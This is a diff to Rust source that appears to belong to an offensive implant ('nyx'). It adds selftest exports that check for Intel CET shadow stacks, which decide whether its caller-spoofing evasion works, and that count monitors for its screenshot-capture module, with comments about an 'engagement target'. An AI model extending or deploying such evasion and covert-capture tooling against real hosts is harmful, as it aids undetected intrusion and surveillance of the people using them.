@@ -2912,6 +2912,67 @@ pub unsafe extern "system" fn nyx_selftest_insomniac() {
     // Verified by code structure, not by runtime test.
     unsafe { exit(mask) };
 }
+
+// ============================================================================
+// caller_spoof: CET shadow-stack status (replaces the removed IRET_FRAME path)
+// ============================================================================
+//
+// nyx_selftest_cet_status: report whether the host has Intel CET
+// hardware-enforced shadow stack (HSP) enabled for this process. The
+// IRET_FRAME-based CET-safe spoof path that would have consumed this flag was
+// removed (it required CET-capable hardware to validate, which the engagement
+// target lacks). The probe stays as a runtime diagnostic so the operator can
+// confirm whether call_with_spoofed_return is actually spoofing on this host
+// or has degraded to call_plain.
+//
+//   exit 0 = CET not present (spoof path active when a usable stub is found)
+//   exit 1 = CET present (spoof path degrades to call_plain)
+//
+// (is_cet_enabled fails OPEN — returns false on resolver failure — so a
+// pre-bootstrap call surfaces as "CET off".)
+
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_cet_status() {
+    let status = crate::caller_spoof::selftest_cet_status();
+    unsafe { exit(status as u32) };
+}
+
+// ============================================================================
+// screenshot: display enumeration diagnostic (replaces multi-monitor TODO)
+// ============================================================================
+//
+// nyx_selftest_display_count: enumerate the number of physical displays via
+// EnumDisplayMonitors. The multi-monitor per-display CAPTURE path was never
+// implemented and is out of scope for the current engagement (single-monitor
+// VPS); this selftest replaces the "would need EnumDisplayMonitors and is
+// still a TODO" marker with a concrete diagnostic that actually answers
+// "how many displays does this host have?". The capture itself remains
+// single-virtual-screen.
+//
+//   exit 0xFFFFFFFF = user32 / EnumDisplayMonitors could not be resolved
+//                      (count_displays internally force-loads user32 then
+//                      re-resolves the export; both failures collapse to this)
+//   exit N (>= 1)    = N displays enumerated (1 expected on the engagement VPS)
+//
+// Note: count_displays() returns 0 both for "0 monitors" and "resolver
+// failed". A GUI-capable Windows host always has >= 1 display once user32 +
+// EnumDisplayMonitors resolve, so 0 here means resolver failure in practice.
+// We surface that as 0xFFFFFFFF so a "real" 0-monitor result is impossible to
+// confuse with a probe failure.
+
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_display_count() {
+    let n = unsafe { crate::screenshot::count_displays() };
+    if n == 0 {
+        // user32 load or EnumDisplayMonitors resolution failed — distinct
+        // sentinel so the operator can tell "probe broke" from a real count.
+        unsafe { exit(0xFFFF_FFFF) };
+    }
+    unsafe { exit(n) };
+}
+
 // ============================================================================
 // These wrappers call the internal functions (not the #[no_mangle] exports) so
 // `cargo test` on a hosted Windows runner can exercise the same code paths.
